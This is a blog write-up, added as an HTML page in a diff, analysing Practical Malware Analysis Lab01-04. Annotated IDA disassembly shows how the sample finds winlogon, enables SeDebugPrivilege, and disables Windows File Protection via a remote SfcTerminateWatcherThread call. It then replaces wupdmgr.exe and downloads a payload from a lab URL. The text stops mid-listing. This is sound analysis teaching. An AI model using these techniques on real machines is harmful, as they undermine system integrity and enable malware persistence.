@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Lab01-04</title><!-- Begin Jekyll SEO tag v2.6.1 -->
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Lab01-04" />
+<meta name="author" content="silma" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Practical Malware Analysis Lab01-04" />
+<meta property="og:description" content="Practical Malware Analysis Lab01-04" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-17T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Lab01-04","dateModified":"2020-04-17T00:00:00+02:00","url":"/series/pma/pma-Lab01-04/","datePublished":"2020-04-17T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"/series/pma/pma-Lab01-04/"},"author":{"@type":"Person","name":"silma"},"description":"Practical Malware Analysis Lab01-04","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">/</a></li><li><a href="/writeups.html">writeups</a></li><li><a href="/series.html">series</a></li><li><a href="/cheatsheets.html">cheatsheets</a></li><li><a href="/about.html">about</a></li></ul>
+  </div>
+</header>
+<main>
+      <h1 id="practical-malware-analysis-lab01-04">Practical Malware Analysis Lab01-04</h1>
+<p><br /></p>
+
+<p><strong>Tools:</strong> IDA Free 7.0, Resource Hacker
+<strong>Keywords:</strong> token privileges, Windows file protection
+<strong>IDA databases:</strong> <a href="/assets/series/pma/Lab01-04.i64">Lab01-04.i64</a> <a href="/assets/series/pma/Lab01-04_rsrc.i64">Lab01-04_rsrc.i64</a><br />
+<a href=""></a></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Filename</th>
+      <th>Size</th>
+      <th>MD5</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Lab01-04.exe</td>
+      <td>37 Ko</td>
+      <td>625ac05fd47adc3c63700c3b30de79ab</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+<h2 id="overview">Overview</h2>
+
+<p>A malware installing a fake Windows Update Manager. It:</p>
+<ul>
+  <li><a href="#find_winlogon">Searches</a> for Winlogon;</li>
+  <li><a href="#bypass_wfp">Disables</a> the Windows File Protection;</li>
+  <li><a href="#rsrc_drop">Drops</a> the fake updater on disk;</li>
+  <li><a href="#fake_updater">Downloads</a> an aditionnal payload from the URL <strong>http://www.practicalmalwareanalysis.com/updater.exe</strong></li>
+</ul>
+
+<h2 id="find_winlogon">Finding Winlogon PID</h2>
+
+<p>The <em>main()</em> function starts by using the APIs <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a> and <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress</a> to obtain the addresses of <a href="https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses">EnumProcesses</a>, <a href="https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocessmodules">EnumProcessModules</a>, and <a href="https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getmodulebasenamea">GetModuleBaseNameA</a> (code not shown). 
+It calls the API EnumProcesses to retrieve the list of PIDs on the system:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401423</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">lpcbNeeded</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401429</span>    <span class="nv">push</span>    <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x0040142A</span>    <span class="nv">push</span>    <span class="mh">1000h</span>           <span class="c1">; dw array size</span>
+<span class="err">0</span><span class="nf">x0040142F</span>    <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwProcessId</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401435</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; list of PIDs</span>
+<span class="err">0</span><span class="nf">x00401436</span>    <span class="nv">call</span>    <span class="nv">addr_EnumProcesses</span>
+</code></pre></div></div>
+<p>Then, it enters a loop that parses this list and calls the function <em>0x401000</em> (here renamed <em>IsWinlogonPID()</em>):</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401485</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">i</span><span class="p">]</span>   <span class="c1">; counter</span>
+<span class="err">0</span><span class="nf">x0040148B</span>    <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nb">edx</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="nv">dwProcessId</span><span class="p">],</span> <span class="mi">0</span>
+<span class="err">0</span><span class="nf">x00401493</span>    <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">next_pid</span>
+<span class="err">0</span><span class="nf">x00401495</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">i</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0040149B</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nb">eax</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="nv">dwProcessId</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004014A2</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; dwProcessId</span>
+<span class="err">0</span><span class="nf">x004014A3</span>    <span class="nv">call</span>    <span class="nv">IsWinlogonPID</span>
+<span class="err">0</span><span class="nf">x004014A8</span>    <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>          <span class="c1">; adjust stack</span>
+<span class="err">0</span><span class="nf">x004014AB</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">flag_found_winlogon</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x004014B1</span>    <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">flag_found_winlogon</span><span class="p">],</span> <span class="mi">0</span>
+<span class="err">0</span><span class="nf">x004014B8</span>    <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">next_pid</span>
+<span class="err">0</span><span class="nf">x004014BA</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">i</span><span class="p">]</span>    <span class="c1">; index in a list of dw</span>
+<span class="err">0</span><span class="nf">x004014C0</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nb">edx</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="nv">dwProcessId</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004014C7</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">winlogon_PID</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x004014CD</span>    <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">exit_loop</span>
+</code></pre></div></div>
+<p>The function <em>IsWinlogonPID()</em> retrieves the name of a process given its PID. First, it gets a process handle:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x0040106D</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwProcessId</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401070</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; dwProcessId</span>
+<span class="err">0</span><span class="nf">x00401071</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; bInheritHandle</span>
+<span class="err">0</span><span class="nf">x00401073</span>    <span class="nv">push</span>    <span class="mh">410h</span>  <span class="c1">; PROCESS_QUERY_INFORMATION | PROCESS_VM_READ</span>
+<span class="err">0</span><span class="nf">x00401078</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">OpenProcess</span>
+<span class="err">0</span><span class="nf">x0040107E</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hProcess</span><span class="p">],</span> <span class="nb">eax</span>
+</code></pre></div></div>
+<p>Then, it uses this handle to call the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocessmodules">EnumProcessModules</a>. This API retrieves a list of handles, one for each module of the specified process. After some digging in my debugger, it appeared these handles were imagebases, and the first entry of the list was the imagebase the specified process. In the code below, we notice the array receiving the handles is only 4 bytes long:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401087</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">required_size</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0040108D</span>    <span class="nv">push</span>    <span class="nb">eax</span>   <span class="c1">; output</span>
+<span class="err">0</span><span class="nf">x0040108E</span>    <span class="nv">push</span>    <span class="mi">4</span>     <span class="c1">; size = 1 dword</span>
+<span class="err">0</span><span class="nf">x00401090</span>    <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hModules_array</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401096</span>    <span class="nv">push</span>    <span class="nb">ecx</span>   <span class="c1">; ptr hModules</span>
+<span class="err">0</span><span class="nf">x00401097</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hProcess</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0040109A</span>    <span class="nv">push</span>    <span class="nb">edx</span>
+<span class="err">0</span><span class="nf">x0040109B</span>    <span class="nv">call</span>    <span class="nv">addr_EnumProcessModules</span>
+</code></pre></div></div>
+<p>No further adjusments are made (e.g. allocating memory on the heap using the variable “requiried_size”), thus only one handle is retrieved, and this handle is the imagebase of the specified process.
+Finally, the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getmodulebasenamea">GetModuleBaseNameA</a> is called and the string returned is compared to the string “<em>winlogon.exe</em>”:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004010A5</span>    <span class="nv">push</span>    <span class="mh">104h</span>            <span class="c1">; buffer size</span>
+<span class="err">0</span><span class="nf">x004010AA</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buffer</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004010B0</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; output</span>
+<span class="err">0</span><span class="nf">x004010B1</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hModules_array</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004010B7</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; process imagebase</span>
+<span class="err">0</span><span class="nf">x004010B8</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hProcess</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004010BB</span>    <span class="nv">push</span>    <span class="nb">edx</span>
+<span class="err">0</span><span class="nf">x004010BC</span>    <span class="nv">call</span>    <span class="nv">addr_GetModuleBaseNameA</span>
+<span class="err">0</span><span class="nf">x004010C2</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">strWinlogonExe</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004010C5</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; Str2</span>
+<span class="err">0</span><span class="nf">x004010C6</span>    <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buffer</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004010CC</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; Str1</span>
+<span class="err">0</span><span class="nf">x004010CD</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">_stricmp</span>
+</code></pre></div></div>
+<p>If the strings don’t match the function <em>IsWinlogonPID()</em> returns “false” and the next PID is tested, but if they match the value “true” is returned.</p>
+
+<h2 id="bypass_wfp">Bypassing Windows File Protection</h2>
+
+<p>Once the PID of winlogon is found, the function <em>0x401174</em> (here renammed <em>RemoteCallSfcTerminateWatcherThread()</em>) is called:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004014E4</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">winlogon_PID</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004014EA</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; dwProcessId</span>
+<span class="err">0</span><span class="nf">x004014EB</span>    <span class="nv">call</span>    <span class="nv">RemoteCallSfcTerminateWatcherThread</span>
+</code></pre></div></div>
+<p>This function disables the Windows File Protection.</p>
+
+<h3 id="what-is-wfp">What is WFP?</h3>
+
+<p>The <a href="https://support.microsoft.com/en-us/help/222193/description-of-the-windows-file-protection-feature">Windows File Protection</a> (WFP) is a feature introduced in Windows 2000 to prevent the replacement of system files, whether accidental or malicious. Besides Windows 2000, the WFP is present on XP and Server 2003. The successor of the WFP is the <a href="https://docs.microsoft.com/en-us/windows/win32/wfp/windows-resource-protection-portal">Windows Resource Protection</a> (WRP) and became available starting with Vista and Server 2008.
+The WFP relies on two mechanisms:</p>
+<ol>
+  <li>The first mechanism is the <a href="https://support.microsoft.com/en-us/help/929833/use-the-system-file-checker-tool-to-repair-missing-or-corrupted-system"><em>sfc.exe</em></a> tool which can be executed from an elevated shell: it checks protected files and restores missing / non-legitimately modified ones.</li>
+  <li>The second mechanism is a <a href="https://www.aldeid.com/wiki/WFP-Windows-File-Protection">backgound protection</a> relying on <em>Winlogon</em> and the DLLs <em>sfc.dll</em>, <em>sfc_os.dll</em>, and <em>sfcfiles.dll</em>: a watcher thread waits for directory change notifications, and if a protected file is replaced by a non-legitimate one, it is restored.
+According to <a href="https://support.microsoft.com/en-us/help/222193/description-of-the-windows-file-protection-feature">Microsoft</a>, the legitimate ways to replace protected files are:
+    <ul>
+      <li>Windows Service Pack installation using Update.exe;</li>
+      <li>Hotfixes installed using Hotfix.exe or Update.exe;</li>
+      <li>Operating system upgrades using Winnt32.exe;</li>
+      <li>Windows Update.</li>
+    </ul>
+  </li>
+</ol>
+
+<p><a href=""></a>
+The XP era brings nostalgia, so I quickly grepped inside those good old 29A archives and found GriYo’s <a href="https://vx-underground.org/zines/29a/29a4/29A-4.226.txt">Win2K infection</a> (use API <a href="https://docs.microsoft.com/en-us/windows/win32/api/sfc/nf-sfc-sfcisfileprotected">SfcIsFileProtected</a> to avoid protected files), Benny and Ratter’s <a href="https://vx-underground.org/zines/29a/29a6/29A-6.201.txt">Win2k.SFPDisable</a> (hotpatching <em>sfc.dll</em>), and Ratters’s <a href="https://vx-underground.org/zines/29a/29a7/Articles/29A-7.004.txt">SFP revisited</a> (use the undocumented APIs SfcTerminateWatcherThread and SfcFileException).<br />
+Note that WFP bypasses have been extensively studied and this section is not exhaustive.</p>
+
+<h3 id="calling-sfcterminatewatcherthread">Calling SfcTerminateWatcherThread</h3>
+
+<p>The bypass implemented in the malware is similar to the code published in <a href="https://vx-underground.org/zines/29a/29a7/Articles/29A-7.004.txt">29A vol.7</a>.</p>
+
+<p>First the <strong>SeDebugPrivilege</strong> has to be enabled. It is the purpose of function <em>0x4010FC</em> (renammed <em>AdjustPrivileges()</em>), and it can be split in 3 parts:</p>
+<ol>
+  <li>Opening the access token of the current process:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401102</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">TokenHandle</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401105</span>    <span class="nv">push</span>    <span class="nb">eax</span>   <span class="c1">; output (TokenHandle)</span>
+<span class="err">0</span><span class="nf">x00401106</span>    <span class="nv">push</span>    <span class="mh">28h</span>   <span class="c1">; TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY</span>
+<span class="err">0</span><span class="nf">x00401108</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">GetCurrentProcess</span>
+<span class="err">0</span><span class="nf">x0040110E</span>    <span class="nv">push</span>    <span class="nb">eax</span>   <span class="c1">; ProcessHandle</span>
+<span class="err">0</span><span class="nf">x0040110F</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">OpenProcessToken</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Retrieving the LUID of the requested privilege:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401120</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">NewState.PrivilegeCount</span><span class="p">],</span> <span class="mi">1</span>
+<span class="err">0</span><span class="nf">x00401127</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">NewState.Privileges.Attributes</span><span class="p">],</span> <span class="mi">2</span>
+<span class="err">0</span><span class="nf">x0040112E</span>    <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">NewState.Privileges</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401131</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; lpLuid</span>
+<span class="err">0</span><span class="nf">x00401132</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">privilege_name</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401135</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; -&gt;"SeDebugPrivilege"</span>
+<span class="err">0</span><span class="nf">x00401136</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpSystemName</span>
+<span class="err">0</span><span class="nf">x00401138</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">LookupPrivilegeValueA</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Adjusting the privilege:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401153</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; ReturnLength</span>
+<span class="err">0</span><span class="nf">x00401155</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; PreviousState</span>
+<span class="err">0</span><span class="nf">x00401157</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; BufferLength</span>
+<span class="err">0</span><span class="nf">x00401159</span>    <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">NewState</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0040115C</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; NewState</span>
+<span class="err">0</span><span class="nf">x0040115D</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; DisableAllPrivileges</span>
+<span class="err">0</span><span class="nf">x0040115F</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">TokenHandle</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401162</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; TokenHandle</span>
+<span class="err">0</span><span class="nf">x00401163</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">AdjustTokenPrivileges</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>Next, the address of export n°2 of <em>sfc_os.dll</em> (<strong>SfcTerminateWatcherThread</strong>) is retrieved:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004011A1</span>    <span class="nv">push</span>    <span class="mi">2</span>               <span class="c1">; lpProcName</span>
+<span class="err">0</span><span class="nf">x004011A3</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">LibFileName</span> <span class="c1">; "sfc_os.dll"</span>
+<span class="err">0</span><span class="nf">x004011A8</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">LoadLibraryA</span>
+<span class="err">0</span><span class="nf">x004011AE</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hModule</span>
+<span class="err">0</span><span class="nf">x004011AF</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">GetProcAddress</span>
+<span class="err">0</span><span class="nf">x004011B5</span>    <span class="nv">mov</span>     <span class="nv">addr_SfcTerminateWatcherThread</span><span class="p">,</span> <span class="nb">eax</span>
+</code></pre></div></div>
+<p>Finally, the API SfcTerminateWatcherThread is called from within the context of Winlogon thanks to the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004011BA</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwProcessId</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004011BD</span>    <span class="nv">push</span>    <span class="nb">eax</span>                <span class="c1">; winlogon PID</span>
+<span class="err">0</span><span class="nf">x004011BE</span>    <span class="nv">push</span>    <span class="mi">0</span>                  <span class="c1">; bInheritHandle</span>
+<span class="err">0</span><span class="nf">x004011C0</span>    <span class="nv">push</span>    <span class="nv">PROCESS_ALL_ACCESS</span> <span class="c1">; dwDesiredAccess</span>
+<span class="err">0</span><span class="nf">x004011C5</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">OpenProcess</span>
+<span class="err">0</span><span class="nf">x004011CB</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hProcess</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004011D8</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpThreadId</span>
+<span class="err">0</span><span class="nf">x004011DA</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; dwCreationFlags</span>
+<span class="err">0</span><span class="nf">x004011DC</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpParameter</span>
+<span class="err">0</span><span class="nf">x004011DE</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nv">addr_SfcTerminateWatcherThread</span>
+<span class="err">0</span><span class="nf">x004011E4</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; lpStartAddress</span>
+<span class="err">0</span><span class="nf">x004011E5</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; dwStackSize</span>
+<span class="err">0</span><span class="nf">x004011E7</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpThreadAttributes</span>
+<span class="err">0</span><span class="nf">x004011E9</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hProcess</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004011EC</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; hProcess</span>
+<span class="err">0</span><span class="nf">x004011ED</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">CreateRemoteThread</span>
+</code></pre></div></div>
+
+<h2 id="rsrc_drop">Dropping a fake Windows Update Manager</h2>
+
+<p>The original update manager is moved to the path <strong>%TEMP%\winup.exe</strong> and the function <em>0x4011FC</em> (renamed <em>DropFakeWindowsUpdateManager()</em>) is called:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401576</span>    <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">path_to_temp_winup</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0040157C</span>    <span class="nv">push</span>    <span class="nb">edx</span>   <span class="c1">; New: %TEMP%\winup.exe</span>
+<span class="err">0</span><span class="nf">x0040157D</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">path_to_sys32_wupdmgr</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401583</span>    <span class="nv">push</span>    <span class="nb">eax</span>   <span class="c1">; Existing: C:\Windows\system32\wupdmgr.exe</span>
+<span class="err">0</span><span class="nf">x00401584</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">MoveFileA</span>
+<span class="err">0</span><span class="nf">x0040158A</span>    <span class="nv">call</span>    <span class="nv">DropFakeWindowsUpdateManager</span>
+</code></pre></div></div>
+<p>The function <em>DropFakeWindowsUpdateManager()</em> retrieves the resource named “<em>#101</em>” and loads it into memory (this resource can be dumped with the resource editor of your choice. My preference goes to <a href="http://www.angusj.com/resourcehacker/">Resource Hacker</a>):</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004012AA</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">Type</span>     <span class="c1">; "BIN"</span>
+<span class="err">0</span><span class="nf">x004012AF</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">Name</span>     <span class="c1">; "#101"</span>
+<span class="err">0</span><span class="nf">x004012B4</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hModule</span><span class="p">]</span> <span class="c1">; malware</span>
+<span class="err">0</span><span class="nf">x004012B7</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hModule</span>
+<span class="err">0</span><span class="nf">x004012B8</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">FindResourceA</span>
+<span class="err">0</span><span class="nf">x004012BE</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hResInfo</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x004012C4</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hResInfo</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004012CA</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; hResInfo</span>
+<span class="err">0</span><span class="nf">x004012CB</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hModule</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004012CE</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; hModule</span>
+<span class="err">0</span><span class="nf">x004012CF</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">LoadResource</span>
+<span class="err">0</span><span class="nf">x004012D5</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">lpBuffer</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x004012D8</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hResInfo</span><span class="p">]</span>
